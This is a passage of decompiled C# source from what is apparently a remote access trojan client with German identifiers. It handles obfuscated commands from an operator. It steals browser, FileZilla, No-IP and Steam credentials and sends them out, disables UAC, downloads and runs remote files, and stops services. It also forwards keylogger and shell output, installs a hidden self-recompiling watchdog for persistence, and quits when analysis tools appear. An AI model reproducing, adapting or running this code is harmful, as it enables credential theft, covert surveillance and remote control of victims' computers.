					text24 += Passwortstealer.NO_IP_Stealen();
					text24 = Conversions.ToString(Operators.ConcatenateObject((object)text24, Passwortstealer.GetFireFoxPWs()));
					Client.Senden(text24);
				}
				catch (Exception projectError72)
				{
					ProjectData.SetProjectError(projectError72);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("KŤɷͰђՖ"), false) == 0)
			{
				try
				{
					string text25 = GClass0.smethod_0("GŨɻʹіՒاܨ\u0829ढ");
					text25 += Passwortstealer.CD_SerialKeys();
					text25 = Conversions.ToString(Operators.ConcatenateObject((object)text25, Passwortstealer.SteamUserNamenStealen()));
					text25 += Passwortstealer.FileZilla_Stealen();
					text25 += Passwortstealer.NO_IP_Stealen();
					text25 = Conversions.ToString(Operators.ConcatenateObject((object)text25, Passwortstealer.GetFireFoxPWs()));
					Client.Senden(text25);
				}
				catch (Exception projectError73)
				{
					ProjectData.SetProjectError(projectError73);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("ZŏɎ\u0348Ѯի٢ݼ\u086e॰੬ୡ\u0c71൧\u0e6f"), false) == 0)
			{
				try
				{
					Module1.UAC_Deakrivieren(ja: true);
				}
				catch (Exception projectError74)
				{
					ProjectData.SetProjectError(projectError74);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("XōɈ\u034bѢռٮݰ\u086cॡ\u0a71୧౯"), false) == 0)
			{
				try
				{
					Module1.UAC_Deakrivieren(ja: false);
				}
				catch (Exception projectError75)
				{
					ProjectData.SetProjectError(projectError75);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("EŤɠ\u0367хկٮݫ\u086f५\u0a61\u0b4f౭൦"), false) == 0)
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("WŞɄ\u0358ЪՉكݏࡄ\u094eਫ਼") + Befehle[1]);
				}
				catch (Exception projectError76)
				{
					ProjectData.SetProjectError(projectError76);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("IŨɸ\u0344Ѭկ٤ݮࡨॠ\u0a48୬\u0c65൲"), false) == 0)
			{
				try
				{
					string text26 = GClass0.smethod_0("@Ũɫ\u0360Ѣդ٬\u0744ࡨॡ੶ଧనഩย");
					foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Interaction.Environ(GClass0.smethod_0("pŦɯͱ"))))
					{
						if (file2.Contains(GClass0.smethod_0("]Ņɗ\u032bъՂو\u0745ࡍ")))
						{
							FileInfo fileInfo2 = new FileInfo(file2);
							text26 = text26 + Strings.Split(fileInfo2.get_Name(), GClass0.smethod_0("^"), -1, (CompareMethod)0)[1] + GClass0.smethod_0("8ĸȺ") + fileInfo2.Length + GClass0.smethod_0("}ĩɿ");
						}
					}
					Client.Senden(text26);
				}
				catch (Exception projectError77)
				{
					ProjectData.SetProjectError(projectError77);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("MŬɼ\u0353Ѯլٷݏ\u086d०"), false) == 0)
			{
				try
				{
					string vonHier = Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("WŞɄ\u0358ЪՉكݏࡄ\u094eਫ਼") + Befehle[1];
					Module1.Logsender logsender = new Module1.Logsender();
					logsender.VonHier = vonHier;
					Module2.VictimID = Befehle[2];
					logsender.Start();
				}
				catch (Exception projectError78)
				{
					ProjectData.SetProjectError(projectError78);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("[Žɨ\u036aѾլ\u064eݵࡩ२\u0a42୪౮\u0d64"), false) == 0)
			{
				try
				{
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।")))
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।"));
					}
				}
				catch (Exception projectError79)
				{
					ProjectData.SetProjectError(projectError79);
					ProjectData.ClearProjectError();
				}
				try
				{
					Module1.FileGetter fileGetter2 = new Module1.FileGetter();
					Module2.VictimID = Befehle[3];
					fileGetter2.vonhier = Befehle[1];
					fileGetter2.nachhier = Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("VűɰͲѶաتݦ\u087a।");
					fileGetter2.GetUpdatedServerFromServer();
				}
				catch (Exception projectError80)
				{
					ProjectData.SetProjectError(projectError80);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("UţɶͰѢհٵ"), false) == 0)
			{
				try
				{
					this.m.Close();
					this.m = null;
					Application.Restart();
				}
				catch (Exception projectError81)
				{
					ProjectData.SetProjectError(projectError81);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Dźɬ\u0366ѐգ٧ݷࡪॶ\u0a64"), false) == 0)
			{
				try
				{
					Process.Start(Befehle[1]);
				}
				catch (Exception projectError82)
				{
					ProjectData.SetProjectError(projectError82);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("LŨɱ\u036bѨլ٣ݥ"), false) == 0)
			{
				try
				{
					string text27 = Interaction.Environ(GClass0.smethod_0("pŦɯͱ"));
					Befehle[1] = Befehle[1].Replace(GClass0.smethod_0("]"), GClass0.smethod_0("."));
					string text28 = Strings.Split(Befehle[1], GClass0.smethod_0("."), -1, (CompareMethod)0)[(int)(Strings.Split(Befehle[1], GClass0.smethod_0("."), -1, (CompareMethod)0).LongLength - 1L)];
					if (Operators.CompareString(Befehle[2], GClass0.smethod_0("hŠ"), false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Befehle[1], text27 + GClass0.smethod_0("]") + text28);
						Process.Start(text27 + GClass0.smethod_0("]") + text28);
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Befehle[1], text27 + GClass0.smethod_0("]") + text28);
					}
				}
				catch (Exception projectError83)
				{
					ProjectData.SetProjectError(projectError83);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("Lůɽ\u035bѢմٳݭࡠ१ੲ"), false) == 0)
			{
				try
				{
					Client.Senden(GClass0.smethod_0("_ŮɸͿѡդ٣ݶ\u0827न\u0a29ଢ") + GetServices());
				}
				catch (Exception projectError84)
				{
					ProjectData.SetProjectError(projectError84);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]Ũɾͽѣժ٭\u0745ࡣॠ੪୧౧൯"), false) == 0)
			{
				try
				{
					ServiceController[] services = ServiceController.GetServices(((ServerComputer)MyProject.Computer).get_Name());
					ServiceController[] array = services;
					foreach (ServiceController val in array)
					{
						if (Operators.CompareString(val.get_ServiceName(), Befehle[1], false) == 0)
						{
							val.Close();
						}
					}
				}
				catch (Exception projectError85)
				{
					ProjectData.SetProjectError(projectError85);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]Ũɾͽѣժ٭ݔ\u0872४ੴ୳౧൯"), false) == 0)
			{
				try
				{
					ServiceController[] services2 = ServiceController.GetServices(((ServerComputer)MyProject.Computer).get_Name());
					ServiceController[] array2 = services2;
					foreach (ServiceController val2 in array2)
					{
						if (Operators.CompareString(val2.get_ServiceName(), Befehle[1], false) == 0)
						{
							val2.Stop();
						}
					}
				}
				catch (Exception projectError86)
				{
					ProjectData.SetProjectError(projectError86);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(Befehle[0], GClass0.smethod_0("]Ũɾͽѣժ٭ݔ\u0872।੶୷౧൯"), false) != 0)
			{
				return;
			}
			try
			{
				ServiceController[] services3 = ServiceController.GetServices(((ServerComputer)MyProject.Computer).get_Name());
				ServiceController[] array3 = services3;
				foreach (ServiceController val3 in array3)
				{
					if (Operators.CompareString(val3.get_ServiceName(), Befehle[1], false) == 0)
					{
						val3.Continue();
					}
				}
			}
			catch (Exception projectError87)
			{
				ProjectData.SetProjectError(projectError87);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Client_OnConnect()
	{
		try
		{
			Client.Senden(ErsterString());
			AktuellesFenster.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string GetServices()
	{
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Invalid comparison between Unknown and I4
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Invalid comparison between Unknown and I4
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Invalid comparison between Unknown and I4
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Invalid comparison between Unknown and I4
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Invalid comparison between Unknown and I4
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Invalid comparison between Unknown and I4
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		int num5 = default(int);
		ServiceController[] services = default(ServiceController[]);
		ServiceController[] array = default(ServiceController[]);
		ServiceController val = default(ServiceController);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 557:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_000e;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_003b;
						case 6:
							goto IL_0055;
						case 7:
							goto IL_006f;
						case 8:
							goto IL_007e;
						case 11:
							goto IL_0097;
						case 12:
						case 13:
							goto IL_00ac;
						case 14:
							goto IL_00b9;
						case 15:
						case 16:
							goto IL_00ce;
						case 17:
							goto IL_00db;
						case 18:
						case 19:
							goto IL_00f0;
						case 20:
							goto IL_00fd;
						case 21:
						case 22:
							goto IL_0112;
						case 23:
							goto IL_011f;
						case 24:
						case 25:
							goto IL_0134;
						case 26:
							goto IL_0141;
						case 27:
						case 28:
							goto IL_0156;
						case 29:
							goto IL_0171;
						case 9:
						case 10:
							goto IL_017a;
						case 30:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 31:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0156:
					num = 28;
					text += GClass0.smethod_0("}ĩɿ");
					num5 = checked(num5 + 1);
					goto IL_0171;
					IL_0141:
					num = 26;
					text += GClass0.smethod_0("]Źɣͻњլ٦ݣ\u086f५\u0a63ସసഺ");
					goto IL_0156;
					IL_0009:
					num = 2;
					text = null;
					goto IL_000e;
					IL_000e:
					num = 3;
					services = ServiceController.GetServices(((ServerComputer)MyProject.Computer).get_Name());
					goto IL_0021;
					IL_0021:
					num = 4;
					array = services;
					num5 = 0;
					goto IL_002a;
					IL_002a:
					if (num5 >= array.Length)
					{
						break;
					}
					val = array[num5];
					goto IL_003b;
					IL_0171:
					num = 29;
					goto IL_002a;
					IL_003b:
					num = 5;
					text = text + val.get_ServiceName() + GClass0.smethod_0("8ĸȺ");
					goto IL_0055;
					IL_0055:
					num = 6;
					text = text + val.get_DisplayName() + GClass0.smethod_0("8ĸȺ");
					goto IL_006f;
					IL_006f:
					num = 7;
					if ((int)val.get_Status() == 7)
					{
						goto IL_007e;
					}
					goto IL_017a;
					IL_007e:
					num = 8;
					text += GClass0.smethod_0("Yũɲ\u0375Ѡՠظ\u0738࠺");
					goto IL_017a;
					IL_017a:
					num = 10;
					if ((int)val.get_Status() == 4)
					{
						goto IL_0097;
					}
					goto IL_00ac;
					IL_0097:
					num = 11;
					text += GClass0.smethod_0("Xżɦ\u0369ѯի٣\u0738࠸\u093a");
					goto IL_00ac;
					IL_00ac:
					num = 13;
					if ((int)val.get_Status() == 1)
					{
						goto IL_00b9;
					}
					goto IL_00ce;
					IL_00b9:
					num = 14;
					text += GClass0.smethod_0("YŽɧͷѶՠ٠\u0738࠸\u093a");
					goto IL_00ce;
					IL_00ce:
					num = 16;
					if ((int)val.get_Status() == 6)
					{
						goto IL_00db;
					}
					goto IL_00f0;
					IL_00db:
					num = 17;
					text += GClass0.smethod_0("_ůɸͿѮ՚٬ݦࡣ९੫\u0b63సസ\u0e3a");
					goto IL_00f0;
					IL_00f0:
					num = 19;
					if ((int)val.get_Status() == 5)
					{
						goto IL_00fd;
					}
					goto IL_0112;
					IL_00fd:
					num = 20;
					text += GClass0.smethod_0("Qžɾͻѧգٹݮ\u085a६੦\u0b63౯൫\u0e63༸\u1038ᄺ");
					goto IL_0112;
					IL_0112:
					num = 22;
					if ((int)val.get_Status() == 2)
					{
						goto IL_011f;
					}
					goto IL_0134;
					IL_011f:
					num = 23;
					text += GClass0.smethod_0("\\źɬ;ѿ՚٬ݦࡣ९੫\u0b63సസ\u0e3a");
					goto IL_0134;
					IL_0134:
					num = 25;
					if ((int)val.get_Status() == 3)
					{
						goto IL_0141;
					}
					goto IL_0156;
					end_IL_0000_2:
					break;
				}
				num = 30;
				text2 = text;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 557;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string ErsterString()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		int width = default(int);
		int height = default(int);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 720:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0037;
						case 5:
							goto IL_0054;
						case 6:
							goto IL_0072;
						case 7:
							goto IL_0090;
						case 8:
							goto IL_00b3;
						case 9:
							goto IL_00d2;
						case 10:
							goto IL_00ec;
						case 11:
							goto IL_0137;
						case 12:
							goto IL_0151;
						case 13:
							goto IL_015c;
						case 15:
							goto IL_0173;
						case 16:
							goto IL_0177;
						case 14:
						case 17:
						case 18:
							goto IL_018c;
						case 19:
							goto IL_019d;
						case 21:
							goto IL_01b4;
						case 22:
							goto IL_01b8;
						case 20:
						case 23:
						case 24:
							goto IL_01cd;
						case 25:
							goto IL_01e7;
						case 26:
							goto IL_0201;
						case 27:
							goto IL_021b;
						case 28:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 29:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_021b:
					num = 27;
					text = text + MySettingsProperty.Settings.VictimNotiz + GClass0.smethod_0("'Ĩȩ\u0322");
					break;
					IL_0201:
					num = 26;
					text = text + Module1.GetAntivirus() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_021b;
					IL_0009:
					num = 2;
					width = Screen.get_PrimaryScreen().get_Bounds().Width;
					goto IL_0020;
					IL_0020:
					num = 3;
					height = Screen.get_PrimaryScreen().get_Bounds().Height;
					goto IL_0037;
					IL_0037:
					num = 4;
					text = MyProject.User.get_Name() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0054;
					IL_0054:
					num = 5;
					text = text + Module1.Getcn.GetLetters().ToString() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0072;
					IL_0072:
					num = 6;
					text = text + Module1.Getcn.GetLetters().ToString() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0090;
					IL_0090:
					num = 7;
					text = text + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_00b3;
					IL_00b3:
					num = 8;
					text = text + AktuellesFenster.GetActiveWindowTitle() + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_00d2;
					IL_00d2:
					num = 9;
					text = text + Module2.VictimName + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_00ec;
					IL_00ec:
					num = 10;
					text = text + width + GClass0.smethod_0("'Ĩȩ\u0322") + height + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0137;
					IL_0137:
					num = 11;
					text = text + Module2.ServerVersion + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0151;
					IL_0151:
					num = 12;
					if (Module2.OffKeylogger)
					{
						goto IL_015c;
					}
					goto IL_0173;
					IL_015c:
					num = 13;
					text += GClass0.smethod_0("LŤȧ\u0328ЩԢ");
					goto IL_018c;
					IL_0173:
					num = 15;
					goto IL_0177;
					IL_0177:
					num = 16;
					text += GClass0.smethod_0("FŢɯ\u036bЧԨةܢ");
					goto IL_018c;
					IL_018c:
					num = 18;
					if (RemoteWebcam.method_0())
					{
						goto IL_019d;
					}
					goto IL_01b4;
					IL_019d:
					num = 19;
					text += GClass0.smethod_0("LŤȧ\u0328ЩԢ");
					goto IL_01cd;
					IL_01b4:
					num = 21;
					goto IL_01b8;
					IL_01b8:
					num = 22;
					text += GClass0.smethod_0("FŢɯ\u036bЧԨةܢ");
					goto IL_01cd;
					IL_01cd:
					num = 24;
					text = text + Syn.DDOSStatus + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_01e7;
					IL_01e7:
					num = 25;
					text = text + Module2.Passwort + GClass0.smethod_0("'Ĩȩ\u0322");
					goto IL_0201;
					end_IL_0000_2:
					break;
				}
				num = 28;
				text2 = text;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 720;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Client_OnReconnect()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 102:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0022:
					num = 4;
					RemoteWebcam.Stopp();
					break;
					IL_0015:
					num = 3;
					AktuellesFenster.Stopp();
					goto IL_0022;
					IL_0008:
					num = 2;
					Keylogger.Stopp();
					goto IL_0015;
					end_IL_0000_2:
					break;
				}
				num = 5;
				RemoteDesktop.Stopp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 102;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void ShellKonsole_ShellAnswer(string sText)
	{
		try
		{
			Client.Senden(GClass0.smethod_0("^Ťɮ\u0366ѥ՜٢ݾ\u0871धਨ\u0b29ఢ") + sText);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Keylogger_NewOnlineKeyLoggs(string sText)
	{
		try
		{
			Client.Senden(GClass0.smethod_0("GŮɳ\u0365ѧՠ١ݶ\u0827न\u0a29ଢ") + sText);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DateiSuche_DateiGefunden(string Pfad, string DateiName, string string_0, string s)
	{
		try
		{
			Client.Senden(GClass0.smethod_0("Uűɻ\u036bѤՋٮݬ\u087c०\u0a63\u0b63౫ധศ༩ဢ") + Pfad + GClass0.smethod_0("'Ĩȩ\u0322") + DateiName + GClass0.smethod_0("'Ĩȩ\u0322") + string_0 + GClass0.smethod_0("'Ĩȩ\u0322") + s + GClass0.smethod_0("'Ĩȩ\u0322"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ")))
		{
			try
			{
				Module1.VbCompile(TextBox1.get_Text().Replace(GClass0.smethod_0("-šɩ\u0375ѱեٯݮ\u0825"), Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵")), GClass0.smethod_0("IŢɫ\u036f"), Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
				FileSystem.SetAttr(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"), (FileAttribute)2);
				Interaction.Shell(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"), (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ")))
		{
			try
			{
				Module1.VbCompile(TextBox1.get_Text().Replace(GClass0.smethod_0("-šɩ\u0375ѱեٯݮ\u0825"), Interaction.Environ(Module2.InstallationsOrdner) + GClass0.smethod_0("PŘɼ\u036aѠըٵݱ\u082aॡ\u0a63୵")), GClass0.smethod_0("IŢɫ\u036f"), Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
				FileSystem.SetAttr(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"), (FileAttribute)2);
				Interaction.Shell(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"), (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (!Propzessvorhanden(GClass0.smethod_0("vŲɹ")))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private bool Propzessvorhanden(string name)
	{
		Process[] processesByName = Process.GetProcessesByName(name);
		if (0 >= processesByName.Length)
		{
			return false;
		}
		return true;
	}

	private void Socks5Manager_SendText(string sText)
	{
		Client.Senden(GClass0.smethod_0("YŦɫ\u036cѵ\u0530اܨ\u0829ढ") + sText);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			bool flag = false;
			if (process.MainWindowTitle.Contains(GClass0.smethod_0("^šɵ\u0363Ѷլ٢ݰࡪ")))
			{
				flag = true;
			}
			if (process.MainWindowTitle.Contains(GClass0.smethod_0("PŖɀ\u0324ѓՐ\u064e")))
			{
				flag = true;
			}
			if (process.MainWindowTitle.Contains(GClass0.smethod_0("HŪɩͽчՠ٦")))
			{
				flag = true;
			}
			if (process.MainWindowTitle.Contains(GClass0.smethod_0("YŤɩ\u0375ѲՖ٪ݪࡤ१")))
			{
				flag = true;
			}
			if (!flag)
			{
				continue;
			}
			Timer1.Stop();
			try
			{
				if (Module2.Persistenz)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(GClass0.smethod_0("vŲɹ"));
						foreach (Process process2 in processesByName)
						{
							process2.Kill();
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ(GClass0.smethod_0("pŦɯͱ")) + GClass0.smethod_0("TŲɶͽЪզٺݤ"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				Client.Deisconnect();
				Application.Exit();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void FunFunktionen_ChatMSG(string sText)
	{
		Client.Senden(GClass0.smethod_0("HŢɨͼъյ٢ܧࠨऩਢ") + sText);
	}
}
